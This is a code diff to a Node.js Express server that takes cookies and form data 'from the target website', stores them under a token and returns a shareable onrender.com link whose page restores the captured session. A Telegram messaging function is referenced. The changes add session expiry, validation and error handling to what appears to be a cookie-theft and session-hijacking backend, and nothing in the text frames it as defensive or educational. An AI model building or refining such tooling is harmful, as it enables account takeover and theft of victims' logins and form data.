@@ -54,28 +54,56 @@ async function sendTelegramMessage(message) {
 // Store session data in memory (replace with a database in production)
 const sessions = {};
 
+// Clean up expired sessions every hour
+setInterval(() => {
+    const now = new Date();
+    Object.keys(sessions).forEach(token => {
+        const session = sessions[token];
+        const sessionAge = now - new Date(session.timestamp);
+        if (sessionAge > 3600000) { // 1 hour in milliseconds
+            delete sessions[token];
+            console.log(`Deleted expired session: ${token}`);
+        }
+    });
+}, 3600000); // Run every hour
+
 // Endpoint to generate a shareable token
 app.post('/generate-token', (req, res) => {
-    const sessionData = {
-        url: req.body.url, // URL of the current page
-        cookies: req.body.cookies || '', // Cookies from the target website
-        formData: req.body.formData || {}, // Form data (if any)
-        timestamp: new Date().toISOString(), // Timestamp for tracking
-    };
+    try {
+        const { url, cookies, formData } = req.body;
 
-    const token = uuidv4(); // Generate a unique token
-    sessions[token] = sessionData; // Store session data
+        if (!url || !cookies || !formData) {
+            return res.status(400).json({ error: 'Missing required fields' });
+        }
 
-    const shareableLink = `https://test-em43.onrender.com/share?token=${token}`; // Shareable link
-    res.status(200).json({ token, shareableLink });
+        const sessionData = {
+            url, // URL of the current page
+            cookies, // Cookies from the target website
+            formData, // Form data (if any)
+            timestamp: new Date().toISOString(), // Timestamp for tracking
+        };
+
+        const token = uuidv4(); // Generate a unique token
+        sessions[token] = sessionData; // Store session data
+
+        const shareableLink = `https://test-em43.onrender.com/share?token=${token}`; // Shareable link
+        res.status(200).json({ token, shareableLink });
+    } catch (error) {
+        console.error('Error generating token:', error);
+        res.status(500).json({ error: 'Internal Server Error' });
+    }
 });
 
 // Endpoint to retrieve session data and automate the session
 app.get('/share', (req, res) => {
-    const token = req.query.token;
-    const sessionData = sessions[token];
+    try {
+        const token = req.query.token;
+        const sessionData = sessions[token];
 
-    if (sessionData) {
+        if (!sessionData) {
+            return res.status(404).send('Invalid or expired token');
+        }
+
         // Return an HTML page with JavaScript to restore the session
         res.send(`
             <!DOCTYPE html>
@@ -128,8 +156,9 @@ app.get('/share', (req, res) => {
             </body>
             </html>
         `);
-    } else {
-        res.status(404).send('Invalid or expired token');
+    } catch (error) {
+        console.error('Error retrieving session data:', error);
+        res.status(500).send('Internal Server Error');
     }
 });
 
